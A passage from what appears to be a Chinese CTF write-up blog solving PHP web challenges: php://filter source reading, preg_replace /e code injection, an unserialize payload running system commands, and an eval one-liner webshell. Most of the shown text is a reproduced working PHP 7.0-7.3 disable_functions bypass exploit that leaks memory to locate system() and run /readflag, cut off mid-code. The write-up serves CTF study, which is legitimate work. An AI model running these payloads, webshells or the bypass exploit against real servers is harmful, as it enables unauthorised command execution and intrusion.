class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解答<br>读取 next.php 文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://8db9374d-313e-4a56-8c16-b395e7075b1f.node3.buuoj.cn/?text=php://input&amp;file=php://filter/<span class="built_in">read</span>=base64-convert.encode/resource=next.php</span><br><span class="line"></span><br><span class="line">post： I have a dream</span><br></pre></td></tr></table></figure><p>next.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详情可看此文章： <a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a>   </p><p>preg_replace 语句如果直接写在程序里面，当然可以成功执行 phpinfo() ，然而我们的 <code>.*</code>是通过 GET 方式传入，传上去的<code>.*</code>变成了<code>__*</code>，由于在PHP中，对于传入的非法的 <code>$_GET</code> 数组参数名，会将其转换成下划线，这就导致正则匹配失效。提供一个 payload ： <code>\S*=${phpinfo()}</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">'cat /flag'</span>);</span><br></pre></td></tr></table></figure><p>为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)。如果这个理解了，你就能明白下面这个问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(phpinfo()); // 结果：布尔 <span class="literal">true</span></span><br><span class="line">var_dump(strtolower(phpinfo()));// 结果：字符串 <span class="string">'1'</span></span><br><span class="line">var_dump(preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'1'</span>,<span class="string">'&#123;$&#123;phpinfo()&#125;&#125;'</span>));// 结果：字符串<span class="string">'11'</span></span><br><span class="line"></span><br><span class="line">var_dump(preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'strtolower("\\1")'</span>,<span class="string">'&#123;$&#123;phpinfo()&#125;&#125;'</span>));// 结果：空字符串<span class="string">''</span></span><br><span class="line">var_dump(preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'strtolower("&#123;$&#123;phpinfo()&#125;&#125;")'</span>,<span class="string">'&#123;$&#123;phpinfo()&#125;&#125;'</span>));// 结果：空字符串<span class="string">''</span></span><br><span class="line">这里的<span class="string">'strtolower("&#123;$&#123;phpinfo()&#125;&#125;")'</span>执行后相当于 strtolower(<span class="string">"&#123;<span class="variable">$&#123;1&#125;</span>&#125;"</span>) 又相当于 strtolower(<span class="string">"&#123;null&#125;"</span>) 又相当于 <span class="string">''</span> 空字符串</span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>读取index.php源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php</span><br><span class="line">post:func=readfile&amp;p=index.php</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过了很多，发现有个类，没有被可过滤，可以利用反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"find / -name flag*"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> $test=<span class="keyword">new</span> Test();</span><br><span class="line"> <span class="keyword">echo</span> serialize($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>寻找flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php </span><br><span class="line">post: func=unserialize&amp;p=O:4:<span class="string">"Test"</span>:2:&#123;s:1:<span class="string">"p"</span>;s:16:<span class="string">"grep -r 'flag' /"</span>;s:4:<span class="string">"func"</span>;s:6:<span class="string">"system"</span>;&#125;</span><br></pre></td></tr></table></figure><p>得到flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php </span><br><span class="line">post: func=unserialize&amp;p=O:4:<span class="string">"Test"</span>:2:&#123;s:1:<span class="string">"p"</span>;s:22:<span class="string">"cat /tmp/flagoefiu4r93"</span>;s:4:<span class="string">"func"</span>;s:6:<span class="string">"system"</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure><p>构造一句话，用蚁剑连接 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">'eval($_POST["ye1s"]);'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>猜测需要执行/readflag文件才能得到flag，接下来上传disable functions bypass脚本突破执行命令即可，bypass脚本github有很多，自己找一下即可。<br>如绕过脚本：<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn("uname -a");</span></span><br><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span 